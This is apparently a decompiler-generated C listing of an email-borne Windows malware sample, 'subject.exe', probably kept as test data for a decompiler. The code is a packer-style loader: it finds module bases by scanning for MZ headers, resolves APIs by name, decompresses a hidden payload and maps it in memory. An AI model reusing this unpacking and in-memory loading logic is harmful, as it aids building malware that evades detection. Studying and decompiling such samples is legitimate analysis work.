// subject.c
// Generated on 5/4/2015 12:46:32 AM by decompiling malware_via_email/malware_0188/ia32_pe/subject.exe
// using Decompiler version 0.4.2.0.

#include "subject.h"

void fn00401010(selector fs)
{
	word32 eax_3 = fn004013FE(fs);
	Mem5[fp - 0x00000004:word32] = 0x0040101F;
	fn004012F8(eax_3);
	fn00401109(fn004015EC(), ebp);
	Mem10[fp - 0x00000004:word32] = Mem5[0x00402178:word32];
	Mem15[fp - 0x00000004:word32] = fn004011F4(dwArg00);
	Mem17[fp - 0x00000008:word32] = Mem15[0x00402174:word32];
	fn00401393(dwArg00);
	fn00401690();
	fn004010BA(fs);
	fn00401293(dwArg00);
	Mem21[fp - 0x00000004:word32] = 0x00000064;
	Sleep(Mem21[fp - 0x00000004:DWORD]);
	Mem24[fp - 0x00000004:word32] = 0x00000000;
	ExitProcess(Mem24[fp - 0x00000004:UINT]);
	int3();
	fn00401060();
	return;
}

void fn00401060()
{
	word32 ecx_20 = (word32) Mem0[0x00402080:byte];
	word32 ebx_17 = Mem0[0x004021A0:word32] + (word32) (Mem0[0x004021A4:word32] *u 0x000000A0);
	Mem23[ebx_17 + 0x00000000:byte] = (byte) ecx_20;
	word32 esi_22 = 0x00402081;
	word32 edi_26 = ebx_17 + 0x00000001;
	while (ecx_20 != 0x00000000)
	{
		Mem32[edi_26 + 0x00000000:byte] = Mem23[esi_22 + 0x00000000:byte];
		esi_22 = esi_22 + 0x00000001;
		edi_26 = edi_26 + 0x00000001;
		ecx_20 = ecx_20 - 0x00000001;
	}
	Mem38[0x004021A4:word32] = Mem23[0x004021A4:word32] + 0x00000001;
	fn00401097();
	return;
}

void fn00401097()
{
	if (Mem0[0x004021A4:word32] == 0x00000200)
	{
		Mem6[0x004021A4:word32] = 0x00000100;
		Mem7[0x004021A8:word32] = 0x00000009;
	}
	return;
}

void fn004010BA(selector fs)
{
fn004010BA_entry:
l004010BA:
	branch 0x00000000 == 0x00000000 l004010C0
l004010BF:
l004010C0:
	Mem14[Mem0[Mem0[fs:0x00000018:word32] + 0x00000030:word32] + 0x00000008:word32] = Mem0[0x00402174:word32]
	return
fn004010BA_exit:
}

void fn004010D5()
{
	word32 ebx_15 = Mem0[0x004021A0:word32] + 0x00000001;
	byte cl_13 = 0x00;
	word32 ecx_12 = 0x00000100;
	do
	{
		Mem16[ebx_15 + 0x00000000:byte] = 0x01;
		Mem17[ebx_15 + 0x00000000:byte] = cl_13;
		cl_13 = cl_13 + 0x01;
		ebx_15 = ebx_15 + 0x000000A0;
		ecx_12 = DPB(ecx_12, cl_13, 0, 8);
	} while (cl_13 != 0x00);
	Mem26[0x004021A4:word32] = ecx_12;
	return;
}

void fn004010F8()
{
	Mem7[0x004021AC:byte] = Mem0[0x00402081:byte];
	return;
}

void fn00401109(word32 eax, word32 ebp)
{
	Mem0[0x00402004:word32]();
	Mem24[0x00402184:word32] = eax;
	Mem24[0x00402000:word32]();
	Mem31[0x00402178:word32] = eax;
	Mem31[0x00402004:word32]();
	Mem38[0x0040218C:word32] = eax;
	fn004011DA();
	Mem39[0x004021A0:word32] = 0x00402000;
	fn004010D5();
	Mem43[0x004021A8:word32] = 0x00000009;
	word32 eax_44 = fn0040157F();
	Mem47[fp - 0x00000040:word32] = eax_44;
	fn004012BA(dwArg00);
	fn00401262();
	fn004010F8();
	word32 dwLoc0C_45 = eax_44;
	word32 esp_49 = fp - 0x0000003C;
	while (Mem47[0x0040219C:word32] - Mem47[0x00402170:word32] >= Mem47[0x004021A8:word32])
	{
		word32 esp_67;
		word32 eax_61 = fn0040157F();
		if (eax_61 > Mem47[0x004021A4:word32] - 0x00000001)
		{
			word32 esp_73 = esp_49 - 0x00000004;
			Mem74[esp_73 + 0x00000000:word32] = dwLoc0C_45;
			fn004012BA(dwArg00);
			fn004012E2();
			esp_67 = esp_73 + 0x00000004;
		}
		else
		{
			word32 esp_76 = esp_49 - 0x00000004;
			Mem77[esp_76 + 0x00000000:word32] = eax_61;
			fn004012BA(dwArg00);
			esp_67 = esp_76 + 0x00000004;
		}
		fn00401262();
		fn004010F8();
		word32 esp_68 = esp_67 - 0x00000004;
		Mem69[esp_68 + 0x00000000:word32] = dwLoc0C_45;
		fn004012BA(dwArg00);
		fn004012E2();
		fn00401060();
		esp_49 = esp_68 + 0x00000004;
		dwLoc0C_45 = eax_61;
	}
	return;
}

void fn004011DA()
{
	Mem0[0x00402000:word32]();
	return;
}

word32 fn004011F4(word32 dwArg04)
{
	word32 ebx_19 = dwArg04 + Mem0[dwArg04 + 0x0000003C:word32];
	Mem22[0x00402174:word32] = Mem0[ebx_19 + 0x00000034:word32];
	word32 eax_23 = (word32) Mem22[ebx_19 + 0x00000006:byte];
	Mem22[0x00402014:word32]();
	fn0040137D(eax_23, dwArg04, Mem22[ebx_19 + 0x00000054:word32]);
	word32 dwLoc08_24 = eax_23;
	word32 edi_45 = ebx_19 + 0x000000F8;
	do
	{
		fn0040137D(eax_23 + Mem22[edi_45 + 0x0000000C:word32], dwArg04 + Mem22[edi_45 + 0x00000014:word32], Mem22[edi_45 + 0x00000010:word32]);
		word32 v10_62 = dwLoc08_24 - 0x00000001;
		edi_45 = edi_45 + 0x00000028;
		dwLoc08_24 = v10_62;
	} while (v10_62 != 0x00000000);
	return Mem22[ebx_19 + 0x00000028:word32] + eax_23;
}

void fn00401262()
{
	word32 ecx_32 = (word32) Mem0[0x00402080:byte];
	word32 edi_30 = Mem0[0x00402178:word32] + Mem0[0x0040217C:word32];
	Mem34[0x0040217C:word32] = Mem0[0x0040217C:word32] + ecx_32;
	word32 esi_36 = 0x00402081;
	while (ecx_32 != 0x00000000)
	{
		Mem42[edi_30 + 0x00000000:byte] = Mem34[esi_36 + 0x00000000:byte];
		esi_36 = esi_36 + 0x00000001;
		edi_30 = edi_30 + 0x00000001;
		ecx_32 = ecx_32 - 0x00000001;
	}
	return;
}

void fn00401293(word32 dwArg04)
{
	Mem0[0x00402008:word32]();
	Mem0[0x00402018:word32]();
	Mem0[0x0040200C:word32]();
	return;
}

void fn004012BA(word32 dwArg04)
{
	word32 ebx_36 = Mem0[0x004021A0:word32] + (word32) (dwArg04 *u 0x000000A0);
	word32 edi_28 = 0x00402080;
	word32 ecx_39 = (word32) Mem0[ebx_36 + 0x00000000:byte] + 0x00000001;
	word32 esi_41 = ebx_36;
	while (ecx_39 != 0x00000000)
	{
		Mem46[edi_28 + 0x00000000:byte] = Mem0[esi_41 + 0x00000000:byte];
		esi_41 = esi_41 + 0x00000001;
		edi_28 = edi_28 + 0x00000001;
		ecx_39 = ecx_39 - 0x00000001;
	}
	return;
}

void fn004012E2()
{
	Mem8[0x00402080:byte] = Mem0[0x00402080:byte] + 0x01;
	Mem13[(word32) Mem8[0x00402080:byte] + 0x00402080:byte] = Mem8[0x004021AC:byte];
	return;
}

void fn004012F8(word32 eax)
{
	fn00401316(eax, fp - 0x00000004);
	fn00401340(fp - 0x00000004);
	fn0040136A(fp - 0x00000004);
	return;
}

void fn00401316(word32 eax, word32 ebp)
{
	Mem0[0x00402018:word32]();
	Mem9[ebp - 0x00000008:word32] = eax;
	Mem9[0x00402008:word32]();
	Mem28[ebp - 0x00000004:word32] = 0x00000000;
	return;
}

void fn00401340(word32 ebp)
{
	Mem4[ebp + 0xFFFFFD2C:word32] = 0x00010002;
	Mem4[0x0040201C:word32]();
	word32 eax_10 = Mem4[ebp + 0x00000008:word32];
	Mem11[ebp + 0xFFFFFDDC:word32] = eax_10;
	Mem11[0x00402020:word32]();
	return;
}

void fn0040136A(word32 ebp)
{
	Mem0[0x00402024:word32]();
	Mem0[0x0040200C:word32]();
	return;
}

void fn0040137D(word32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	word32 edi_13 = dwArg04;
	word32 esi_15 = dwArg08;
	word32 ecx_17 = dwArg0C;
	while (ecx_17 != 0x00000000)
	{
		Mem23[edi_13 + 0x00000000:byte] = Mem0[esi_15 + 0x00000000:byte];
		esi_15 = esi_15 + 0x00000001;
		edi_13 = edi_13 + 0x00000001;
		ecx_17 = ecx_17 - 0x00000001;
	}
	return;
}

void fn00401393(word32 dwArg04)
{
	word32 esp_26 = fp - 0x00000028;
	word32 ebx_38 = Mem0[Mem0[dwArg04 + 0x0000003C:word32] + dwArg04 + 0x00000080:word32] + dwArg04;
	do
	{
		word32 eax_43 = Mem0[ebx_38 + 0x0000000C:word32] + dwArg04;
		esp_26 = esp_26 - 0x00000004;
		Mem46[esp_26 + 0x00000000:word32] = eax_43;
		Mem46[0x0040202C:word32]();
		word32 esi_52 = Mem46[ebx_38 + 0x00000000:word32] + dwArg04;
		word32 edi_54 = Mem46[ebx_38 + 0x00000010:word32] + dwArg04;
		do
		{
			word32 esp_64 = esp_26 - 0x00000004;
			Mem65[esp_64 + 0x00000000:word32] = Mem46[esi_52 + 0x00000000:word32] + dwArg04 + 0x00000002;
			Mem67[esp_64 - 0x00000004:word32] = eax_43;
			esp_26 = esp_64 - 0x00000004;
			Mem67[0x00402028:word32]();
			Mem68[edi_54 + 0x00000000:word32] = eax_43;
			esi_52 = esi_52 + 0x00000004;
		} while (Mem68[esi_52 + 0x00000000:word32] != 0x00000000);
		word32 ebx_73 = ebx_38 - 0x00000002;
		ebx_38 = ebx_73 + 0x00000016;
	} while (Mem68[ebx_73 + 0x00000022:word32] != 0x00000000);
	return;
}

word32 fn004013FE(selector fs)
{
	word32 eax_12 = fn0040142A(fs);
	fn0040148B(0x41636F72, fp - 0x0000000C, eax_12);
	word32 ebp_27;
	return fn00401447(eax_12, dwLoc0C, out ebp_27);
}

word32 fn0040142A(selector fs)
{
	word32 eax_10 = Mem0[Mem0[fs:0x00000000:word32] + 0x00000004:word32] & 0xFFFF0000;
	do
		eax_10 = eax_10 - 0x00010000;
	while (Mem0[eax_10 + 0x00000000:word16] != 0x5A4D);
	return eax_10;
}

word32 fn00401447(word32 dwArg04, word32 dwArg08, ptr32 ebpOut)
{
	fn0040137D(0x00402030, 0x004014D3, 0x000000A5);
	word32 esp_38 = fp - 0x00000024;
	word32 edi_40 = dwArg04;
	word32 esi_41 = 0x004014D3;
	do
	{
		word32 esp_46 = esp_38 - 0x00000004;
		Mem47[esp_46 + 0x00000000:word32] = esi_41;
		Mem49[esp_46 - 0x00000004:word32] = edi_40;
		esp_38 = esp_46 - 0x00000004;
		dwArg08();
		Mem53[0x00402000:word32] = 0x000000A5;
		do
			esi_41 = esi_41 + 0x00000001;
		while (Mem53[esi_41 + 0x00000000:byte] != 0x00);
		esi_41 = esi_41 + 0x00000001;
	} while (Mem53[esi_41 + 0x00000001:byte] != 0x00);
	word32 ebp_78;
	*ebpOut = Mem53[Mem53[esp_46 + 0x00000004:word32]:word32];
	return Mem53[esp_46 + 0x00000018:word32];
}

void fn0040148B(word32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	word32 edi_37 = Mem0[Mem0[dwArg0C + 0x0000003C:word32] + 0x00000078 + dwArg0C:word32] + dwArg0C;
	word32 ecx_38 = 0x00000000;
	word32 ebx_40 = Mem0[edi_37 + 0x00000020:word32] + dwArg0C;
	while (dwArg04 != Mem0[(Mem0[ebx_40 + 0x00000000:word32] + dwArg0C) + 0x00000004:word32])
	{
		ecx_38 = ecx_38 + 0x00000001;
		ebx_40 = ebx_40 + 0x00000004;
	}
	Mem62[dwArg08 + 0x00000000:word32] = (Mem0[edi_37 + 0x0000001C:word32] + dwArg0C)[ecx_38 * 0x00000004] + dwArg0C;
	return;
}

bool fn00401579(word32 esi, ptr32 esiOut)
{
	word32 esi_3;
	*esiOut = esi >>u 0x0000001F;
	return cond(esi >>u 0x0000001F);
}

word32 fn0040157F()
{
	word32 dwLoc14_19 = Mem0[0x00402170:word32];
	word64 edx_eax_22 = SEQ(0x00000000, dwLoc14_19);
	word32 dwLoc14_32 = Mem0[0x004021A8:word32];
	word32 edx_24 = edx_eax_22 % 0x00000020;
	byte dl_26 = (byte) (edx_eax_22 % 0x00000020);
	word32 ebx_29 = Mem0[0x00402190:word32] + (SEQ(edx_eax_22 % 0x00000020, dwLoc14_19) /u 0x00000020 << 0x00000002);
	word32 edi_33 = dwLoc14_32;
	word32 eax_37 = 0x00000000;
	do
	{
		edi_33 = edi_33 - 0x00000001;
		word32 esi_53;
		if (!fn00401579(fn004015E7(__bswap(Mem0[ebx_29 + 0x00000000:word32]), dl_26), out esi_53))
			eax_37 = eax_37 + fn004015E2(esi_53, edi_33);
		edx_24 = edx_24 + 0x00000001;
		dl_26 = (byte) edx_24;
		if (edx_24 == 0x00000020)
		{
			ebx_29 = ebx_29 + 0x00000004;
			edx_24 = 0x00000000;
			dl_26 = 0x00;
		}
	} while (edi_33 != 0x00000000);
	Mem74[0x00402170:word32] = Mem0[0x00402170:word32] + dwLoc14_32;
	return eax_37;
}

word32 fn004015E2(word32 esi, word32 edi)
{
	return esi << (byte) edi;
}

word32 fn004015E7(word32 esi, byte dl)
{
	return esi << dl;
}

word32 fn004015EC()
{
	word32 ecx_17 = Mem0[0x00405074:word32];
	Mem18[0x00402198:word32] = ecx_17;
	Mem20[0x0040219C:word32] = ecx_17 << 0x00000003;
	Mem20[0x00402004:word32]();
	Mem31[0x00402180:word32] = 0x00405000;
	Mem31[0x00402000:word32]();
	Mem38[0x00402190:word32] = 0x00405000;
	word32 eax_39 = Mem38[0x00402198:word32] + 0x00405000;
	Mem41[0x00402194:word32] = eax_39;
	fn0040137D(Mem41[0x00402190:word32], 0x00405088, Mem41[0x00402198:word32]);
	fn00401672(Mem41[0x00402190:word32], Mem41[0x00402198:word32]);
	return eax_39;
}

void fn00401672(word32 dwArg04, word32 dwArg08)
{
	word32 edx_10 = dwArg04;
	word32 ecx_11 = dwArg08;
	do
	{
		Mem14[edx_10 + 0x00000000:byte] = Mem0[edx_10 + 0x00000000:byte] + 0x40;
		edx_10 = edx_10 + 0x00000001;
		ecx_11 = ecx_11 - 0x00000001;
	} while (ecx_11 != 0x00000000);
	Mem21[0x00402190:word32] = Mem14[0x00402190:word32] + 0x00000004;
	return;
}

void fn00401690()
{
	Mem0[0x00402010:word32]();
	Mem0[0x00402010:word32]();
	return;
}

